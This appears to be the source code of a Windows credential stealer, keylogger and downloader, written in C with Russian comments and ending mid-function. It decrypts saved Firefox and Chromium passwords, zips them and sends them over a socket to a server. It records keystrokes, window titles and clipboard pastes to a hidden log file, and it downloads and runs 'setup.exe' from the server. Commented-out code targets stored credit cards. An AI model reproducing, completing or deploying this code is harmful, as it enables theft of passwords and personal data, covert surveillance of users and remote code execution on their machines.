#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <WinSock2.h>
#include <windows.h>

#include "shlobj.h"
#include <Shlwapi.h>
#include <stdio.h>
#include "sqlite3.h"
#include "zip.h"

void GetFileFromServerAndRun(); //объ€вление функции передачи данных ага
void RunStealerAndSendLog(); //объ€вление функции включени€ стиллера и отсылки лога
void GetKeyloggerResoult(); //объ€вление функции отсылки лога кейлогера
void SendFileToServer(char* fileName); //объ€вление функции отсылки лога на сервер
void ClientKeyLoggerThread();

SOCKET SendingSocket;
HW_PROFILE_INFOA hwProfileInfo;

#pragma warning(disable : 4996)
#pragma warning(disable : 4551)

#pragma comment (lib, "Ws2_32.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "crypt32.lib")

int val = 0;

static FILE* u;
static FILE* p;
static FILE* c;
static FILE* w;
size_t PATHSIZE = 30000;
static BOOL nssload = FALSE;

#define PRBool   int
#define PRUint32 unsigned int
#define PR_TRUE  1
#define PR_FALSE 0

typedef enum {
	siBuffer = 0,
	siClearDataBuffer = 1,
	siCipherDataBuffer = 2,
	siDERCertBuffer = 3,
	siEncodedCertBuffer = 4,
	siDERNameBuffer = 5,
	siEncodedNameBuffer = 6,
	siAsciiNameString = 7,
	siAsciiString = 8,
	siDEROID = 9,
	siUnsignedInteger = 10,
	siUTCTime = 11,
	siGeneralizedTime = 12,
	siVisibleString = 13,
	siUTF8String = 14,
	siBMPString = 15
} SECItemType;

typedef struct SECItemStr SECItem;

struct SECItemStr {
	SECItemType type;
	unsigned char* data;
	unsigned int len;
};

typedef enum _SECStatus {
	SECWouldBlock = -2,
	SECFailure = -1,
	SECSuccess = 0
} SECStatus;

typedef struct PK11SlotInfoStr PK11SlotInfo;
typedef SECStatus(*NSS_Init) (const char*);
typedef SECStatus(_cdecl* NSS_Shutdown) (void);
typedef PK11SlotInfo* (_cdecl* PK11_GetInternalKeySlot) (void);
typedef void(_cdecl* PK11_FreeSlot) (PK11SlotInfo*);
typedef SECStatus(_cdecl* PK11_Authenticate) (PK11SlotInfo*, PRBool, void*);
typedef SECStatus(_cdecl* PK11SDR_Decrypt)(SECItem* data, SECItem* result, void* cx);
typedef char* (*PL_Base64Decode_p)(const char* src, PRUint32 srclen, char* dest);

PK11_GetInternalKeySlot PK11GetInternalKeySlot = NULL;
PK11_FreeSlot           PK11FreeSlot = NULL;
PK11_Authenticate       PK11Authenticate = NULL;
PK11SDR_Decrypt         PK11SDRDecrypt = NULL;
NSS_Init                fpNSS_INIT = NULL;
NSS_Shutdown            fpNSS_Shutdown = NULL;
PL_Base64Decode_p       fPL_Base64Decode = NULL;

HMODULE NSS3 = NULL;

VOID tfree(PVOID pMem)
{
	if (pMem)
		free(pMem);
}

PVOID tmalloc(DWORD dwSize)
{
	PBYTE pMem = (PBYTE)malloc(dwSize);
	RtlSecureZeroMemory(pMem, dwSize);
	return(pMem);
}

BOOL nss3(char* temp)
{
	char path[3000];
	GetEnvironmentVariableA("PATH", path, 4096);
	char* newPath = (char*)tmalloc(1024);
	wsprintfA(newPath, "%s;%s", path, temp);
	SetEnvironmentVariableA("PATH", newPath);
	char* nss = (char*)tmalloc(1024);
	wsprintfA(nss, "%s\\nss3.dll", temp);
	NSS3 = LoadLibraryA(nss);

	if (NSS3 != NULL) {
		fpNSS_INIT = (NSS_Init)GetProcAddress(NSS3, "NSS_Init");
		fpNSS_Shutdown = (NSS_Shutdown)GetProcAddress(NSS3, "NSS_Shutdown");
		PK11GetInternalKeySlot = (PK11_GetInternalKeySlot)GetProcAddress(NSS3, "PK11_GetInternalKeySlot");
		PK11FreeSlot = (PK11_FreeSlot)GetProcAddress(NSS3, "PK11_FreeSlot");
		PK11Authenticate = (PK11_Authenticate)GetProcAddress(NSS3, "PK11_Authenticate");
		PK11SDRDecrypt = (PK11SDR_Decrypt)GetProcAddress(NSS3, "PK11SDR_Decrypt");
		fPL_Base64Decode = (PL_Base64Decode_p)GetProcAddress(NSS3, "PL_Base64Decode");

		if (fpNSS_INIT != NULL\
			|| fpNSS_Shutdown != NULL\
			|| PK11GetInternalKeySlot != NULL \
			|| PK11Authenticate != NULL \
			|| PK11SDRDecrypt != NULL \
			|| PK11FreeSlot != NULL \
			|| fPL_Base64Decode != NULL) {
			return TRUE;
		}
		else return FALSE;
	}
	else return FALSE;
}

char* getRandomNumbersA(int Len)
{
	char* nick;
	int i;

	nick = (char*)tmalloc(Len);
	nick[0] = '\0';
	srand(GetTickCount64());

	for (i = 0; i < Len; i++)
	{
		wsprintfA(nick, "%s%d", nick, rand() % 10);
	}

	nick[i] = '\0';
	return nick;
}

wchar_t* getRandomNumbers(int Len)
{
	wchar_t* nick;
	int i;

	nick = (wchar_t*)tmalloc(Len);
	nick[0] = L'\0';
	srand(GetTickCount64());

	for (i = 0; i < Len; i++)
	{
		wsprintfW(nick, L"%s%d", nick, rand() % 10);
	}

	nick[i] = L'\0';
	return nick;
}

int Base64Decode(char* cryptData, char** decodeData, int* decodeLen)
{
	int len = 0;
	int adjust = 0;

	len = strlen(cryptData);

	if (cryptData[len - 1] == '=')
	{
		adjust++;
		if (cryptData[len - 2] == '=')
			adjust++;
	}
	*decodeData = (char*)(*fPL_Base64Decode)(cryptData, len, NULL);
	if (*decodeData == NULL)
	{
		return 0;
	}
	*decodeLen = (len * 3) / 4 - adjust;
	return 1;
}

char* CrackFox(char* s) {
	PK11SlotInfo* slot = NULL;
	SECStatus status;
	SECItem in, out;
	char* result = NULL;
	int decodeLen = 0;
	char* byteData = NULL;
	Base64Decode(s, &byteData, &decodeLen);
	slot = (*PK11GetInternalKeySlot) ();
	if (slot != NULL) {
		status = PK11Authenticate(slot, PR_TRUE, NULL);
		if (status == SECSuccess) {
			in.data = (unsigned char*)byteData;
			in.len = decodeLen;
			out.data = NULL;
			out.len = 0;
			status = (*PK11SDRDecrypt) (&in, &out, NULL);
			if (status == SECSuccess) {
				memcpy(byteData, out.data, out.len);
				byteData[out.len] = 0;
				result = ((char*)byteData);
			}
			else
				return (char*)" ";
		}
		else
			return (char*)" ";
		(*PK11FreeSlot) (slot);
	}
	else
		return (char*)" ";

	return result;
}

void ParsePasswdJson(char* jstring, int dwSize)
{
	int valuecheck1 = 0;
	int valuecheck2 = 0;
	int countworlds = 0;

	int counthostname = 0;
	int countusername = 0;
	int countpassword = 0;

	BOOL checkskobka = FALSE;
	int i = 0;

next:
	while (i < dwSize)
	{
		i++;
		char buffer[30000];

		if (jstring[i] == '\"')
		{
			checkskobka = TRUE;
			valuecheck1++;
		}

		if (checkskobka == TRUE)
		{
			int sizeBuff = 0;
			do {
				i++;
				if (jstring[i] == '\"')
				{
					valuecheck2++;
					checkskobka = FALSE;
				}
				else {
					memmove(&buffer[sizeBuff], &jstring[i], 1);
					sizeBuff++;
				}
			} while (checkskobka == TRUE);

			buffer[sizeBuff] = '\0';
			int size = strlen(buffer);
			countworlds++;

			if (strcmp(buffer, "hostname") == 0)
			{
				counthostname++;
				goto hostname;
			}

			if (strcmp(buffer, "encryptedUsername") == 0)
			{
				countusername++;
				goto username;
			}

			if (strcmp(buffer, "encryptedPassword") == 0)
			{
				countpassword++;
				goto password;
			}
		}
	}

hostname:
	while (i < dwSize)
	{
		i++;
		char* hostbuffer = (char*)tmalloc(30000);

		if (jstring[i] == '\"')
		{
			checkskobka = TRUE;
			valuecheck1++;
		}

		if (checkskobka == TRUE)
		{
			int sizeBuff = 0;
			do {

				i++;
				if (jstring[i] == '\"')
				{
					valuecheck2++;
					checkskobka = FALSE;
				}
				else {
					memmove(&hostbuffer[sizeBuff], &jstring[i], 1);
					sizeBuff++;
				}

			} while (checkskobka == TRUE);

			hostbuffer[sizeBuff] = '\0';

			fputs(hostbuffer, u);
			fputs(";", u);

			fputs("URL: ", p);
			fputs(hostbuffer, p);
			fputs("\r\n", p);
			tfree(hostbuffer);
			goto next;
		}
	}

username:
	while (i < dwSize)
	{
		i++;
		char* userbuffer = (char*)tmalloc(30000);

		if (jstring[i] == '\"')
		{
			checkskobka = TRUE;
			valuecheck1++;
		}

		if (checkskobka == TRUE)
		{
			int sizeBuff = 0;
			do {

				i++;
				if (jstring[i] == '\"')
				{
					valuecheck2++;
					checkskobka = FALSE;
				}
				else {
					memmove(&userbuffer[sizeBuff], &jstring[i], 1);
					sizeBuff++;
				}

			} while (checkskobka == TRUE);

			userbuffer[sizeBuff] = '\0';
			fputs("USR: ", p);
			fputs(CrackFox(userbuffer), p);
			fputs("\r\n", p);
			tfree(userbuffer);
			goto next;
		}
	}

password:
	while (i < dwSize)
	{
		i++;
		char* passbuffer = (char*)tmalloc(30000);

		if (jstring[i] == '\"')
		{
			checkskobka = TRUE;
			valuecheck1++;
		}

		if (checkskobka == TRUE)
		{
			int sizeBuff = 0;
			do {

				i++;
				if (jstring[i] == '\"')
				{
					valuecheck2++;
					checkskobka = FALSE;
				}
				else {
					memmove(&passbuffer[sizeBuff], &jstring[i], 1);
					sizeBuff++;
				}

			} while (checkskobka == TRUE);

			passbuffer[sizeBuff] = '\0';
			fputs("PWD: ", p);
			fputs(CrackFox(passbuffer), p);
			fputs("\r\n\r\n", p);
			tfree(passbuffer);
			goto next;
		}
	}
}

char* CrackChrome(BYTE* pass)
{
	char* strClearData;
	DATA_BLOB data_in, data_out;
	DWORD dwBlobSize;
	CHAR* decrypted;
	data_out.pbData = NULL;
	data_out.cbData = 0;
	data_in.pbData = pass;

	for (dwBlobSize = 128; dwBlobSize <= 2048; dwBlobSize += 16)
	{
		data_in.cbData = dwBlobSize;
		if (CryptUnprotectData(&data_in, NULL, NULL, NULL, NULL, 0, &data_out))
			break;
	}

	if (dwBlobSize >= 2048)
	{
		return NULL;
	}

	strClearData = (char*)tmalloc((data_out.cbData + 1) * sizeof(char));
	if (!strClearData)
	{
		LocalFree(data_out.pbData);
		return NULL;
	}

	decrypted = (char*)tmalloc((data_out.cbData + 1) * sizeof(char));
	memset(decrypted, 0, data_out.cbData);
	memcpy(decrypted, data_out.pbData, data_out.cbData);
	wsprintfA(strClearData, "%s", decrypted);
	LocalFree(data_out.pbData);
	tfree(decrypted);
	return strClearData;
}

void chromiumGetPasswords(wchar_t* dbfile)
{
	sqlite3_stmt* stmt;
	sqlite3* db;

	if (sqlite3_open16(dbfile, &db) == SQLITE_OK) {
		if (sqlite3_prepare_v2(db, "SELECT signon_realm, username_value, password_value FROM logins", -1, &stmt, 0) == SQLITE_OK) {
			while (sqlite3_step(stmt) == SQLITE_ROW) {
				char* data = (char*)tmalloc(512);

				fputs((char*)sqlite3_column_text(stmt, 0), u);
				fputs(";", u);

				wsprintfA(data, "URL: %s\r\nUSR: %s\r\nPWD: %s\r\n\r\n", \
					sqlite3_column_text(stmt, 0), \
					sqlite3_column_text(stmt, 1), \
					CrackChrome((BYTE*)sqlite3_column_text(stmt, 2))\
				);
				fputs(data, p);

				tfree(data);
			}
			sqlite3_finalize(stmt);
			sqlite3_close(db);
		}
	}
}

//void chromiumGetForms(wchar_t* dbfile)
//{
//	sqlite3_stmt* stmt;
//	sqlite3* db;
//
//	if (sqlite3_open16(dbfile, &db) == SQLITE_OK) {
//		if (sqlite3_prepare16_v2(db, "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id FROM credit_cards", -1, &stmt, NULL) == SQLITE_OK) {
//			while (sqlite3_step(stmt) == SQLITE_ROW) {
//				char* data = (char*)tmalloc(1024);
//				wsprintfA(data, "NAME: %s\r\nMONTH: %s\r\nYEAR: %s\r\nCARD: %s\r\nBILL: %s\r\n\r\n", \
//					sqlite3_column_text(stmt, 0), \
//					sqlite3_column_text(stmt, 1), \
//					sqlite3_column_text(stmt, 2), \
//					CrackChrome((BYTE*)sqlite3_column_text(stmt, 3)), \
//					sqlite3_column_text(stmt, 4)
//				);
//				fputs(data, w);
//				tfree(data);
//			}
//		}
//		sqlite3_finalize(stmt);
//		sqlite3_close(db);
//	}
//}

void FindFilesA(char* path)
{
	WIN32_FIND_DATAA ffd;
	CHAR szDir[MAX_PATH];

	strcpy(szDir, path);
	strcat(szDir, "\\*");

	HANDLE hFind = INVALID_HANDLE_VALUE;
	hFind = FindFirstFileA(szDir, &ffd);

	if (nssload == FALSE)
	{
		do
		{
			if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				if ((strcmp(ffd.cFileName, ".") && strcmp(ffd.cFileName, "..")) != 0)
				{
					char* newdir = (char*)tmalloc(3000);
					wsprintfA(newdir, "%s\\%s", path, ffd.cFileName);
					FindFilesA(newdir);
					tfree(newdir);
				}
			}
			else
			{
				if (strcmp(ffd.cFileName, "nss3.dll") == 0)
				{
					if (nss3(path) == TRUE)
					{
						nssload = TRUE;
						break;
					}
				}
			}
		} while (FindNextFileA(hFind, &ffd) != 0);
		FindClose(hFind);
	}
	else
	{
		do
		{
			if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
			{
				if (strcmp(ffd.cFileName, "logins.json") == 0)
				{
					char* jsfilepass = (char*)tmalloc(30000);
					wsprintfA(jsfilepass, "%s\\%s", path, ffd.cFileName);
					HANDLE hFile = CreateFileA(jsfilepass, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
					
					if (INVALID_HANDLE_VALUE != hFile)
					{
						DWORD ALLdwSize = GetFileSize(hFile, nullptr);
						char* lpBuffer = (char*)tmalloc(ALLdwSize);
						DWORD dwBytesRead = 0;
						ReadFile(hFile, lpBuffer, ALLdwSize, &dwBytesRead, nullptr);
						
						if (ALLdwSize == dwBytesRead)
						{
							ParsePasswdJson(lpBuffer, strlen(lpBuffer));
						}
					}

					CloseHandle(hFile);
				}
			}
		} while (FindNextFileA(hFind, &ffd) != 0);
		FindClose(hFind);
	}
}

void FindFiles(wchar_t* path)
{
	static int passwrdCount = 0;
	static int cookiesCount = 0;
	static int webformCount = 0;

	WIN32_FIND_DATAW ffd;
	WCHAR szDir[MAX_PATH];

	wcscpy(szDir, path);
	wcscat(szDir, L"\\*");

	HANDLE hFind = INVALID_HANDLE_VALUE;
	hFind = FindFirstFileW(szDir, &ffd);

	do
	{
		if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			if ((wcscmp(ffd.cFileName, L".") && wcscmp(ffd.cFileName, L"..")) != 0)
			{
				wchar_t* newdir = (wchar_t*)tmalloc(30000);
				wsprintfW(newdir, L"%ls\\%ls", path, ffd.cFileName);
				FindFiles(newdir);
				tfree(newdir);
			}
		}
		else
		{
			if (wcscmp(ffd.cFileName, L"Login Data") == 0)
			{
				wchar_t* dir = (wchar_t*)tmalloc(30000);
				wchar_t* newdir = (wchar_t*)tmalloc(30000);

				wsprintfW(dir, L"%ls\\%ls", path, ffd.cFileName);
				wsprintfW(newdir, L"%ls\\%ls", path, getRandomNumbers(10));

				if (CopyFileW(dir, newdir, FALSE) != 0)
				{
					chromiumGetPasswords(newdir);
					DeleteFileW(newdir);
					passwrdCount++;
				}

				tfree(newdir);
				tfree(dir);
			}

			//if (wcscmp(ffd.cFileName, L"Web Data") == 0)
			//{
			//	wchar_t* dir = (wchar_t*)tmalloc(3000);
			//	wchar_t* newdir = (wchar_t*)tmalloc(3000);

			//	wsprintfW(dir, L"%ls\\%ls", path, ffd.cFileName);
			//	wsprintfW(newdir, L"%ls\\%ls", path, getRandomNumbers(10));

			//	if (CopyFileW(dir, newdir, FALSE) != 0)
			//	{
			//		chromiumGetForms(newdir);
			//		DeleteFileW(newdir);
			//		webformCount++;
			//	}

			//	tfree(newdir);
			//	tfree(dir);
			//}

			if (wcscmp(ffd.cFileName, L"profiles.ini") == 0)
			{
				if (nssload == FALSE)
				{
					char* programs = (char*)tmalloc(PATHSIZE);
					SHGetFolderPathA(NULL, 0x0026, NULL, 0, programs);
					FindFilesA(programs);
					tfree(programs);
				}

				if (nssload == TRUE)
				{
					{
						char* profilesini = (char*)tmalloc(30000);
						char* profilenss3 = (char*)tmalloc(30000);
						wsprintfA(profilesini, "%ls\\%ls", path, ffd.cFileName);

						for (int i = 0; i < 9; i++)
						{
							char* profile = (char*)tmalloc(30000);
							wsprintfA(profile, "Profile%d", i);

							if (GetPrivateProfileStringA(profile, "Path", "", profilenss3, 512, profilesini) > 0)
							{
								SetCurrentDirectoryW(path);
								if (fpNSS_INIT(profilenss3) == SECSuccess)
								{
									FindFilesA(profilenss3);
								}
								fpNSS_Shutdown();
							}
							tfree(profile);
						}
						tfree(profilenss3);
						tfree(profilesini);
					}
				}
			}
		}
	} while (FindNextFileW(hFind, &ffd) != 0);
	FindClose(hFind);
}

wchar_t* logfile = (wchar_t*)L"C:\\ProgramData\\log.txt";

HWND hwnd;
DWORD nThreadId;
HANDLE hThreadHandle;
WCHAR	window_text[1024] = { 0 };
WCHAR	old_window_text[1024] = { 0 };
HWND	hWindowHandle;
WCHAR	wszAppName[1024] = { 0 };
DWORD	dwBytesWritten = 0;
unsigned char header[2] = { 0xFF, 0xFE };
HANDLE hFile = INVALID_HANDLE_VALUE;
SYSTEMTIME LocalTime = { 0 };

void GetFileFromServerAndRun()
{

	DWORD FILELEN = 0;
	HANDLE hFile = CreateFileA("setup.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	recv(SendingSocket, (char*)&FILELEN, sizeof(DWORD), NULL);

	{
		int len = FILELEN;

		while (TRUE)
		{

			int chunk;
			int recved;

			recved = recv(SendingSocket, (char*)&chunk, sizeof(int), NULL);

			if (recved == -1)
			{

				break;

			}

			if (chunk == 0)
			{

				break;

			}

			char* buff = (char*)malloc(chunk);
			DWORD dwBytesWrite = 0;

		doublesended:

			recved = recv(SendingSocket, (char*)buff, chunk, NULL);

			if (recved == -1)
			{

				int err = 1;
				send(SendingSocket, (char*)&err, sizeof(int), NULL);
				goto doublesended;

			}
			else
			{

				int good = 0;
				send(SendingSocket, (char*)&good, sizeof(int), NULL);

			}

			WriteFile(hFile, buff, chunk, &dwBytesWrite, NULL);

		}

		CloseHandle(hFile);

	}

	DWORD GOODJOB = 1;
	send(SendingSocket, (char*)&GOODJOB, sizeof(DWORD), NULL);

	STARTUPINFOA startupInfo = { 0 };
	startupInfo.cb = sizeof(startupInfo);
	PROCESS_INFORMATION processInfo = { 0 };
	CreateProcessA(NULL, (LPSTR)"setup.exe", NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

void SendFileToServer(char* fileName)
{

	HANDLE hFile = CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

	if (INVALID_HANDLE_VALUE != hFile)
	{
		DWORD ALLdwSize = GetFileSize(hFile, nullptr);
		char* lpBuffer = (char*)malloc(ALLdwSize);
		DWORD dwBytesRead = 0;

		ReadFile(hFile, lpBuffer, ALLdwSize, &dwBytesRead, nullptr);
		if (ALLdwSize == dwBytesRead)
		{

			DWORD RES = 0;
			send(SendingSocket, (char*)&dwBytesRead, sizeof(DWORD), NULL);

			int len = dwBytesRead;

			while (len > 0)
			{
				int chunk;
				int sended;
				chunk = 1024;

				if (chunk > len)
				{
					chunk = len;
				}

				send(SendingSocket, (char*)&chunk, sizeof(int), NULL);
				printf("chunk %d\n", chunk);

			doublesended:
				sended = send(SendingSocket, &lpBuffer[dwBytesRead - len], chunk, 0);
				int recved = 0;
				recv(SendingSocket, (char*)&recved, sizeof(int), NULL);
				printf("chunk %d\n", recved);

				if (recved == 1)
				{
					goto doublesended;
				}

				len -= sended;

				if (sended == -1)
				{
					break;
				}

				if (len == 0)
				{
					send(SendingSocket, (char*)&len, sizeof(int), NULL);
					break;
				}
			}

			recv(SendingSocket, (char*)&RES, sizeof(DWORD), NULL);

			if (RES == 1)
			{
				
			}
			else {
				
			}

		}
	}

	CloseHandle(hFile);
}

void RunStealerAndSendLog()
{
	char* urllist = (char*)tmalloc(PATHSIZE);
	char* passowdslist = (char*)tmalloc(PATHSIZE);
	//char* webformslist = (char*)tmalloc(PATHSIZE);
	char* arhive = (char*)tmalloc(PATHSIZE);
	char* tempath = (char*)tmalloc(PATHSIZE);

	wchar_t* localpath = (wchar_t*)tmalloc(PATHSIZE);
	wchar_t* roamigpath = (wchar_t*)tmalloc(PATHSIZE);

	{
		SHGetFolderPathA(NULL, 0x0023, NULL, 0, tempath);
		SHGetFolderPathW(NULL, 0x001c, NULL, 0, localpath);
		SHGetFolderPathW(NULL, 0x001a, NULL, 0, roamigpath);
	}

	{
		strcpy(urllist, tempath);
		strcat(urllist, "//");
		strcat(urllist, "u");

		strcpy(passowdslist, tempath);
		strcat(passowdslist, "//");
		strcat(passowdslist, "p");

		strcpy(arhive, tempath);
		strcat(arhive, "//");
		strcat(arhive, "arh.zip");

		tfree(tempath);
	}

	struct zip_t* zip = zip_open(arhive, ZIP_DEFAULT_COMPRESSION_LEVEL, 'w');
	{

		{

			u = fopen(urllist, "w");
			p = fopen(passowdslist, "w");

		}

		{
			FindFiles(roamigpath);
			FindFiles(localpath);
		}

		{
			tfree(localpath);
			tfree(roamigpath);
		}

		{
			fclose(u);
			fclose(p);
		}

		{
			u = fopen(urllist, "rb");
			p = fopen(passowdslist, "rb");
		}

		zip_entry_open(zip, "urls.txt");
		{
			{
				fseek(u, 0, SEEK_END);
				long fsize = ftell(u);
				fseek(u, 0, SEEK_SET);
				char* urls = (char*)tmalloc(fsize + 1);
				fread(urls, fsize, 1, u);
				fclose(u);
				urls[fsize] = 0;
				zip_entry_write(zip, urls, strlen(urls));
			}
		}
		zip_entry_close(zip);

		zip_entry_open(zip, "passwords.txt");
		{
			{
				fseek(p, 0, SEEK_END);
				long fsize = ftell(p);
				fseek(p, 0, SEEK_SET);
				char* passwords = (char*)tmalloc(fsize + 1);
				fread(passwords, fsize, 1, p);
				fclose(p);
				passwords[fsize] = 0;
				zip_entry_write(zip, passwords, strlen(passwords));
			}
		}
		zip_entry_close(zip);

	}
	zip_close(zip);
	puts("stealer send log");
	SendFileToServer(arhive);
	puts("stealer send end");
}

void WriteToFile(WCHAR* wText)
{
	hFile = CreateFileW(logfile, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hFile, wText, wcslen(wText) * sizeof(wchar_t), &dwBytesWritten, NULL);
	CloseHandle(hFile);
}

void WritesScannedKeyToFile(short sScannedKey)
{
	HKL hkl;
	DWORD dwThreadId;
	DWORD dwProcessId;
	hWindowHandle = GetForegroundWindow();
	dwThreadId = GetWindowThreadProcessId(hWindowHandle, &dwProcessId);
	BYTE* kState = (BYTE*)malloc(256);
	GetKeyboardState(kState);
	hkl = GetKeyboardLayout(dwThreadId);
	wchar_t UniChar[16] = { 0 };
	UINT virtualKey = sScannedKey;
	ToUnicodeEx(virtualKey, sScannedKey, (BYTE*)kState, UniChar, 16, NULL, hkl);
	WriteToFile(UniChar);
	free(kState);
}

void PutKey(short sScannedKey)
{
	HKL hkl;
	DWORD dwThreadId;
	DWORD dwProcessId;
	hWindowHandle = GetForegroundWindow();
	dwThreadId = GetWindowThreadProcessId(hWindowHandle, &dwProcessId);
	BYTE* kState = (BYTE*)malloc(256);
	GetKeyboardState(kState);
	hkl = GetKeyboardLayout(dwThreadId);
	wchar_t UniChar[16] = { 0 };
	UINT virtualKey = sScannedKey;
	ToUnicodeEx(virtualKey, sScannedKey, (BYTE*)kState, UniChar, 16, NULL, hkl);
	_putws(UniChar);
	free(kState);
}

wchar_t* get_clipboard_data()
{
	const HANDLE handle = GetClipboardData(CF_UNICODETEXT);
	const LPCVOID data = GlobalLock(handle);

	if (!OpenClipboard(NULL))
		goto close;


	if (!handle)
		goto close;


	if (!data)
		goto close;

	GlobalUnlock(handle);
	CloseClipboard();

	return (wchar_t*)data;

close:
	GlobalUnlock(handle);
	CloseClipboard();

	return (wchar_t*)L" ";
}

BOOL CONTRPRESS = FALSE;

BOOL is_key_down(const DWORD vk_code)
{
	return GetKeyState(vk_code) >> 15;
}

void ClientKeyLoggerThread()
{
	hFile = CreateFileW(logfile, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hFile, header, 2, &dwBytesWritten, NULL);
	CloseHandle(hFile);

	short sScannedKey;
	while (1)
	{
		Sleep((rand() % 10) + 10);

		for (sScannedKey = 8; sScannedKey <= 222; sScannedKey++)
		{

			if (GetAsyncKeyState(sScannedKey) == -32767)
			{
				hWindowHandle = GetForegroundWindow();

				if (hWindowHandle != NULL)
				{
					if (GetWindowTextW(hWindowHandle, window_text, 1024) != 0)
					{
						if (wcscmp(window_text, old_window_text) != 0)
						{
							hFile = CreateFileW(logfile, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
							GetLocalTime(&LocalTime);
							_snwprintf_s(wszAppName, 1023, L"\n\n%04d/%02d/%02d %02d:%02d:%02d - {%s}\n", LocalTime.wYear, LocalTime.wMonth, LocalTime.wDay, LocalTime.wHour, LocalTime.wMinute, LocalTime.wSecond, window_text);
							WriteFile(hFile, wszAppName, wcslen(wszAppName) * sizeof(wchar_t), &dwBytesWritten, NULL);
							wcscpy_s(old_window_text, window_text);
							CloseHandle(hFile);
						}
					}
				}

				if (true)
				{

					if (is_key_down(VK_CONTROL) && is_key_down(86))
					{
						WriteToFile(get_clipboard_data());
						break;
					}

					if ((sScannedKey >= 39) && (sScannedKey < 91))
					{
						WritesScannedKeyToFile(sScannedKey);
						break;
					}
					else
					{
						switch (sScannedKey)
						{
						case VK_SPACE:
							WriteToFile((wchar_t*)L" ");
							break;
						case VK_SHIFT:
							WriteToFile((wchar_t*)L"[SHIFT]");
							break;
						case VK_RETURN:
							WriteToFile((wchar_t*)L"[ENTER]");
							break;
						case VK_BACK:
							WriteToFile((wchar_t*)L"[BACKSPACE]");
							break;
						case VK_TAB:
							WriteToFile((wchar_t*)L"[TAB]");
							break;
						case VK_CONTROL:
							WriteToFile((wchar_t*)L"[CTRL]");
							break;
						case VK_DELETE:
							WriteToFile((wchar_t*)L"[DEL]");
							break;
						case VK_OEM_1:
							WritesScannedKeyToFile(VK_OEM_1);
							break;
						case VK_OEM_2:
							WritesScannedKeyToFile(VK_OEM_2);
							break;
						case VK_OEM_3:
							WritesScannedKeyToFile(VK_OEM_3);
							break;
						case VK_OEM_4:
							WritesScannedKeyToFile(VK_OEM_4);
							break;
						case VK_OEM_5:
							WritesScannedKeyToFile(VK_OEM_5);
							break;
						case VK_OEM_6:
							WritesScannedKeyToFile(VK_OEM_6);
							break;
						case VK_OEM_7:
							WritesScannedKeyToFile(VK_OEM_7);
							break;
						case VK_OEM_PLUS:
							WriteToFile((wchar_t*)L"+");
							break;
						case VK_OEM_COMMA:
							WritesScannedKeyToFile(VK_OEM_COMMA);
							break;
						case VK_OEM_MINUS:
							WriteToFile((wchar_t*)L"-");
							break;
						case VK_OEM_PERIOD:
							WritesScannedKeyToFile(VK_OEM_PERIOD);
							break;
						case VK_NUMPAD0:
							WriteToFile((wchar_t*)L"0");
							break;
						case VK_NUMPAD1:
							WriteToFile((wchar_t*)L"1");
							break;
						case VK_NUMPAD2:
							WriteToFile((wchar_t*)L"2");
							break;
						case VK_NUMPAD3:
							WriteToFile((wchar_t*)L"3");
							break;
						case VK_NUMPAD4:
							WriteToFile((wchar_t*)L"4");
							break;
						case VK_NUMPAD5:
							WriteToFile((wchar_t*)L"5");
							break;
						case VK_NUMPAD6:
							WriteToFile((wchar_t*)L"6");
							break;
						case VK_NUMPAD7:
							WriteToFile((wchar_t*)L"7");
							break;
						case VK_NUMPAD8:
							WriteToFile((wchar_t*)L"8");
							break;
						case VK_NUMPAD9:
							WriteToFile((wchar_t*)L"9");
							break;
						case VK_CAPITAL:
							WriteToFile((wchar_t*)L"[CAPS LOCK]");
							break;
						case VK_PRIOR:
							WriteToFile((wchar_t*)L"[PAGE UP]");
							break;
						case VK_NEXT:
							WriteToFile((wchar_t*)L"[PAGE DOWN]");
							break;
						case VK_END:
							WriteToFile((wchar_t*)L"[END]");
							break;
						case VK_HOME:
							WriteToFile((wchar_t*)L"[HOME]");
							break;
						case VK_LWIN:
							WriteToFile((wchar_t*)L"[WIN]");
							break;
						case VK_RWIN:
							WriteToFile((wchar_t*)L"[WIN]");
							break;
						case VK_VOLUME_MUTE:
							WriteToFile((wchar_t*)L"[SOUND-MUTE]");
							break;
						case VK_VOLUME_DOWN:
							WriteToFile((wchar_t*)L"[SOUND-DOWN]");
							break;
						case VK_VOLUME_UP:
							WriteToFile((wchar_t*)L"[SOUND-DOWN]");
							break;
						case VK_MEDIA_PLAY_PAUSE:
							WriteToFile((wchar_t*)L"[MEDIA-PLAY/PAUSE]");
							break;
						case VK_MEDIA_STOP:
							WriteToFile((wchar_t*)L"[MEDIA-STOP]");
							break;
						case VK_MENU:
							WriteToFile((wchar_t*)L"[ALT]");
							break;
						default:
							break;
						}
					}
				}
			}
		}
	}
}

void GetKeyloggerResoult()
{
	char* archkeys = (char*)"log.zip";

	struct zip_t* zip = zip_open(archkeys, ZIP_DEFAULT_COMPRESSION_LEVEL, 'w');
	{
		zip_entry_open(zip, "key.log");
		{
			{
				FILE* loggerfile = _wfopen(logfile, L"rb");
				fseek(loggerfile, 0, SEEK_END);
				long fsize = ftell(loggerfile);
				fseek(loggerfile, 0, SEEK_SET);
				BYTE* keys = (BYTE*)tmalloc(fsize + 1);
				fread(keys, fsize, 1, loggerfile);
				fclose(loggerfile);
				keys[fsize] = 0;
				zip_entry_write(zip, (char*)keys, fsize);
				tfree(keys);
			}
		}
		zip_entry_close(zip);
	}
	zip_close(zip);

